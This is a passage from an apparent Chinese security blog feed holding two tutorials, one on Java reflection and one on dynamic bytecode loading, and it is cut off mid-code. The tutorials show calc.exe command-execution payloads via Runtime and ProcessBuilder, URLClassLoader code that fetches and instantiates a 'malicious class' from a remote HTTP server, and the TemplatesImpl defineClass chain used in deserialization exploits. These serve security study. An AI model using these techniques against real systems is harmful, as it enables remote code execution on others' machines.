class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),</span><br><span class="line"><span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用到了 getMethod 和 invoke 方法。 getMethod 的作用是通过反射获取一个类的某个特定的公有方法。而学过Java的同学应该清楚，Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要 传给他你需要获取的函数的参数类型列表。 比如这里的 Runtime.exec 方法有6个重载：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713774614099-f12b5efa-a7f5-41ba-ba46-943882dfe2e2.png" alt=""></p><p>我们使用最简单的，也就是第一个，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。 invoke 的作用是执行方法，它的第一个参数是： 如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。 所以我们将上述命令执行的Payload分解一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="7-反射的进阶">7.反射的进阶</h2><p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类 呢？ 如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p><p>第一个问题，我们需要用到一个新的反射方法 getConstructor 。 和 getMethod 类似， getConstructor 接收的参数是构造函数列表类型，因为构造函数也支持重载， 所以必须用参数列表类型才能唯一确定一个构造函数。 获取到构造函数后，我们使用 newInstance 来执行。 比如，我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后调用 start() 来执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>))).start();</span><br></pre></td></tr></table></figure><p>ProcessBuilder有两个构造函数：</p><p>public ProcessBuilder(List command)</p><p>public ProcessBuilder(String… command)</p><p>我上面用到了第一个形式的构造函数，所以我在 getConstructor 的时候传入的是 List.class 。 但是，我们看到，前面这个Payload用到了Java里的强制类型转换，有时候我们利用漏洞的时候（在表达式上下文中）是没有这种语法的。所以，我们仍需利用反射来完成这一步。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(</span><br><span class="line">Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure><p>通过 getMethod(“start”) 获取到start方法，然后 invoke 执行， invoke 的第一个参数就是 ProcessBuilder Object了。  <img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713777446690-e7f354e3-35f7-48be-9dea-b4e3f79f69fc.png" alt=""> 那么，如果我们要使用 public ProcessBuilder(String… command) 这个构造函数，需要怎样用反 射执行呢？ 这又涉及到Java里的可变长参数（varargs）了。正如其他语言一样，Java也支持可变长参数，就是当你 定义函数的时候不确定参数数量的时候，可以使用 … 这样的语法来表示“这个函数的参数个数是可变 的”。 对于可变长参数，Java其实在编译的时候会编译成一个数组，也就是说，如下这两种写法在底层是等价 的（也就不能重载）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span> &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也由此，如果我们有一个数组，想传给hello函数，只需直接传即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] names = &#123;<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>&#125;;</span><br><span class="line">hello(names);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么对于反射来说，如果要获取的目标函数里包含可变长参数，其实我们认为它是数组就行了。 所以，我们将字符串数组的类 String[].class 传给 getConstructor ，获取 ProcessBuilder 的第二 种构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class)</span><br></pre></td></tr></table></figure><p>在调用 newInstance 的时候，因为这个函数本身接收的是一个可变长参数，我们传给 ProcessBuilder 的也是一个可变长参数，二者叠加为一个二维数组，所以整个Payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再说到今天第二个问题，如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p><p>这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、 getConstructor 区别是：</p><p>getMethod 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法</p><p>getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私 有的方法，但从父类里继承来的就不包含了</p><p>getDeclaredMethod 的具体用法和 getMethod 类似， getDeclaredConstructor 的具体用法和 getConstructor 类似，我就不再赘述。 举个例子，前文我们说过Runtime这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来 获取对象。其实现在我们也可以直接用 getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Java反射(Reflection)是Java非常重要的动态特性，通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java基础" scheme="https://oceanzbz.github.io/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Java动态加载字节码</title>
    <link href="https://oceanzbz.github.io/post/3a009f85.html"/>
    <id>https://oceanzbz.github.io/post/3a009f85.html</id>
    <published>2024-12-30T04:52:17.000Z</published>
    <updated>2025-03-05T07:24:36.792Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java中动态加载字节码的方法">Java中动态加载字节码的方法</h2><h3 id="1、利用-URLClassLoader-加载远程class文件">1、利用 URLClassLoader 加载远程class文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//使用file协议在本地寻找指定.class文件</span></span><br><span class="line">        <span class="comment">//URL[] urls = new URL[]&#123;new URL(&quot;file:///Users/fa1c0n/codeprojects/IdeaProjects/misc-classes/src/main/java/&quot;)&#125;;</span></span><br><span class="line">        <span class="comment">//使用http协议到远程地址寻找指定.class文件</span></span><br><span class="line">        URL[] urls = <span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、利用-ClassLoader-defineClass-直接加载字节码">2、利用 ClassLoader#defineClass 直接加载字节码</h3><h4 id="2-1-双亲委派模型">2.1 双亲委派模型</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714635178241-41ee8245-5f20-4328-a8fa-b0adc838691d.png" alt=""></p><p>BootstrapClassLoader：启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.*.*都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。</p><p>ExtClassLoader：扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。</p><p>AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到。</p><p>ClassLoader.getParent() 可以获取用于委派的父级class loader，通常会返回null来表示bootstrap class loader。</p><h4 id="2-2-双亲委派模型的代码实现">2.2 <a href="https://so.csdn.net/so/search?q=%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B&amp;spm=1001.2101.3001.7020">双亲委派模型</a>的代码实现</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714635321800-c2187423-49fb-496d-9e33-36d083ce10ce.png" alt="">如上图，实现双亲委派的代码都集中在 java.lang.ClassLoader#loadClass()方法中，其逻辑如下：</p><p>先检查是否已被加载过;</p><p>若没有加载过则调用父加载器的loadClass()方法；</p><p>若父加载器为null则默认使用启动类加载器(Bootstrap ClassLoader)作为父加载器；</p><p>如果父加载器加载类失败，抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。(findClass()最终会调用defineClass()加载字节码)</p><p>:::tips<br>注意：</p><p>这里的“双亲”，指的并不是有两个父加载器，可能仅仅是英文“parent”的翻译。每个ClassLoader最多有一个父加载器，也就是parent变量。“双亲委派机制”指的就是优先让父加载器去加载类，如果父加载器没有成功加载到类，才由本ClassLoader加载。</p><p>这样可以保证安全性，防止系统类被伪造(比如自定义java.lang.Object类，肯定是无法运行的)。</p><p>对于Java程序来讲，一般的类是由AppClassLoader来加载的，而系统类则是由BootStrapClassLoader加载的。由于BootStrapClassLoader是在native层实现的，所以调用系统类的getClassLoader()方法会返回null。</p><p>:::</p><h4 id="2-3-自定义ClassLoader">2.3 自定义ClassLoader</h4><p>java.lang.ClassLoader是一个抽象类。创建一个继承自ClassLoader的类，并重写findClass()方法实现类的加载，即可完成自定义ClassLoader。示例如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String dirPath;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyClassLoader&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassLoader</span><span class="params">(String dirPath)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!dirPath.endsWith(<span class="string">&quot;/&quot;</span>) &amp;&amp; !dirPath.endsWith(<span class="string">&quot;\\&quot;</span>)) &#123;</span><br><span class="line">            dirPath += <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.dirPath = dirPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> dirPath + name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] b;</span><br><span class="line">        Path path;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            path = Paths.get(<span class="keyword">new</span> <span class="title class_">URI</span>(filePath));</span><br><span class="line">            b = Files.readAllBytes(path);</span><br><span class="line">            <span class="comment">// defineClass将字节数组转换成Class对象</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | URISyntaxException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、URLClassLoader-（远程加载-Class-文件）">3、URLClassLoader （远程加载 Class 文件）</h3><p>这个加载方式最大的特点就是可以远程进行加载，我们在 VPS 上启一个 http 服务，把恶意类放在 http 服务下，可以实现远程加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 一个 URL 地址， 这里是一个数组类型</span></span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://192.168.1.5:80/&quot;</span>)&#125;;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 使用 URLClassLoader 加载远程 class 文件</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls).loadClass(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 初始化我们的恶意类</span></span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、defineClass-加载字节码">4、defineClass() 加载字节码</h3><p>不管是加载远程class文件，还是本地class文件，Java都经历了下面三个方法的调用：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714635737705-c5e9f19b-aa47-4243-b720-418df35c066e.png" alt=""></p><p>:::tips<br>其中：</p><p>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass</p><p>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass</p><p>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</p><p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java 默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中。</p><p>:::</p><p>使用ClassLoader#defineClass()直接加载类字节码的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDefineClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> </span><br><span class="line">ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, </span><br><span class="line"><span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = </span><br><span class="line">Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA</span></span><br><span class="line"><span class="string">Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs</span></span><br><span class="line"><span class="string">bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh</span></span><br><span class="line"><span class="string">L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry</span></span><br><span class="line"><span class="string">ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n</span></span><br><span class="line"><span class="string">OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA</span></span><br><span class="line"><span class="string">AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> </span><br><span class="line">(Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, </span><br><span class="line"><span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ClassLoader#defineClass()被调用时，Class对象并不会被初始化，只有显示调用其构造方法，初始化代码才能被执行。即使将初始化代码放在类的static块中，在defineClass时也无法被直接调用到。因此，如果要使用defineClass()在目标机器上执行任意代码，需要想办法调用构造方法。</p><h3 id="5、利用-TemplatesImpl-加载字节码">5、利用 TemplatesImpl 加载字节码</h3><p>这里还是记录下主要是从下面这两篇文章抄的</p><p>这个漏洞的触发点在 <code>TemplatesImpl.newTransformer()</code> 方法中，我们来看具体的代码。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481708317-16999829-6682-4592-9972-ce5908531fd4.png" alt=""></p><p>跟到getTransletInstance里去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481734618-64f852aa-16ee-44b2-9b46-14809565c5f1.png" alt="">这里要求_name不能为null否则就直接返回null了_class必须为null否则进不去defineTransletClasses方法里<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481813567-5f113878-7bbe-4239-a0c1-e433b8b39bea.png" alt=""></p><p>这里主要在这个for循环里有defineClass方法里跟进去看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481877903-4792c263-1e5a-4f17-a171-5453d88af998.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733481894465-a4963829-d74b-4a83-bc31-7896345aa676.png" alt=""></p><p>最终还是调用java原生的defineclass加载类，记录下调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">    getTransletInstance()</span><br><span class="line">        defineTransletClasses()</span><br><span class="line">            defineClass()</span><br><span class="line">                ClassLoader.defineClass()               </span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714636913715-f37e64de-8702-4540-abe9-6ffa8b296794.pdf">Java安全漫谈 - 13.Java中动态加载字节码的那些方法.pdf</a></p><p><a href="https://www.lianqing.xyz/?p=561">https://www.lianqing.xyz/?p=561</a></p><h3 id="6、Javassit库：">6、Javassit库：</h3><p><font style="color:rgb(51, 51, 51);">Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。<br></font><font style="color:rgb(51, 51, 51);">能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。<br></font>Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件。</p><p>向Maven的Pom.xml文件中，添加以下字段，以导入依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/javassist/javassist --&gt;</span></span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;javassist&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;<span class="number">3.12</span><span class="number">.1</span>.GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在这个包中，主要调用到的方法是:</p><h4 id="ClassPool">ClassPool:</h4><p>ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用，其中键名是类名称，值是表示该类的CtClass对象。</p><p>常用方法：</p><ul><li>static ClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool；</li><li>ClassPath insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置；</li><li>ClassPath appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置；</li><li>CtClass makeClass：根据类名创建新的CtClass对象；</li><li>CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用；</li></ul><h4 id="CtClass："><strong>CtClass：</strong></h4><p>CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取。</p><p>常用方法：</p><ul><li>void setSuperclass(CtClass clazz)：更改超类，除非此对象表示接口；</li><li>byte[] toBytecode()：将该类转换为类文件；</li><li>CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）；</li></ul><h4 id="示例：">示例：</h4><p>获取字节码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(com.classloader.TemplatesImplEvil.class.getName());</span><br><span class="line"><span class="type">byte</span>[] code = clazz.toBytecode();</span><br></pre></td></tr></table></figure><h3 id="7、BCEL加载字节码">7、BCEL加载字节码</h3><p>这里因为学习fastjson要用到bcel字节码所以这里学习下如何利用bcel加载字节码</p><p>这里我们先准备一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span 